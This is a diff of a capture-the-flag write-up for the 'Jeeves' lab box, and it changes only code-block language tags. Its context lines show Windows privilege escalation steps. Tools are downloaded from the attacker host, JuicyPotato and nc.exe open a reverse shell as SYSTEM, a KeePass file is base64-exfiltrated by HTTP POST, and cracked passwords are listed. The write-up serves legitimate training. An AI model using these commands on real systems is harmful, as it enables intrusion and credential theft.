@@ -125,7 +125,7 @@ We can grab the `user.txt` from `C:\Users\kohsuke\Desktop\user.txt`, from here w
 
 we can see that `kohsuke` user have `SeImpersonatePrivilege` enabled using `whoami /priv` command:
 
-```cmd
+```batch
 C:\Users\kohsuke\Desktop>whoami /priv
 
 PRIVILEGES INFORMATION
@@ -144,7 +144,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 
 we can use `JuicyPotato.exe` for older and `PrintSpoofer.exe` for new Windows version to exploit, we have to run `systeminfo` command and determine which exploit we should use.
 
-```cmd
+```batch
 C:\Users\kohsuke\Desktop>systeminfo
 
 Host Name:                 JEEVES
@@ -165,14 +165,14 @@ python3 -m http.server
 
 Use this command to download them to the target, we are using `C:\Users\Public` directory to hold executables, since it is writable by everyone, making sure we won't have any issues
 
-```cmd
+```batch
 powershell -c "Invoke-WebRequest -Uri http://10.10.16.121:8000/PrintSpoofer64.exe -OutFile C:\Users\Public\PrintSpoofer64.exe"
 powershell -c "Invoke-WebRequest -Uri http://10.10.16.121:8000/nc.exe -OutFile C:\Users\Public\nc.exe"
 ```
 
 next we should execute this command to get reverse shell as `SYSTEM` but before that make sure you have the listener in correct port number running.
 
-```cmd
+```batch
 c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe <tun0> 8443 -e cmd.exe" -t *
 ```
 
@@ -206,7 +206,7 @@ nt authority\system
 
 Another way of Privilege escalating is cracking KeePass Database file and obtaining password for administrator account, we can see that we have `CEH.kdbx` file in `kohsuke` user's Documents directory.
 
-```cmd
+```batch
 C:\Users\kohsuke\Documents>dir
 dir
  Volume in drive C has no label.
@@ -221,7 +221,7 @@ dir
 
 let's now transfer the file to our localhost, we will use easier way to transfer the file by base64 since it is not very big, start a listener to catch the base64 blob, then use this command to sent it:
 
-```cmd
+```batch
 powershell -c "$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\kohsuke\Documents\CEH.kdbx' -Encoding Byte)); Invoke-WebRequest -Uri http://10.10.16.121:9999/ -Method POST -Body $b64"
 ```
 
@@ -274,7 +274,7 @@ keepassxc CEH.kdbx
 
 After we accessed the KeePass database, we can read all the usernames and password for different applications and websites, let's gather all of the values in password entries and try them for `Administrator` user
 
-```
+```plaintext
 12345
 F7WhTrSFDKB6sxHU1cUn
 pwndyouall!
@@ -307,7 +307,7 @@ nt authority\system
 
 Now Probably the hardest part of the box is finding the `root.txt`, in Administrator Desktop, we can see hm.txt file
 
-```cmd
+```batch
  C:\Users\Administrator\Desktop> type hm.txt
 The flag is elsewhere.  Look deeper.
 ```
@@ -315,7 +315,7 @@ The flag is elsewhere.  Look deeper.
 the flag is hidden in `hm.txt` itself, Basically NTFS Alternate Data Streams (ADS) let you hide data inside a file by attaching it as a stream — like `file.txt:hiddendata`. To see them:
 
 
-```cmd
+```batch
 C:\Users\Administrator\Desktop> dir /r
 
 11/08/2017  10:05 AM    <DIR>          .
@@ -327,7 +327,7 @@ C:\Users\Administrator\Desktop> dir /r
 
 we can see the `root.txt` now, we can read the file using this command:
 
-```cmd
+```batch
 more < hm.txt:root.txt
 ```
 
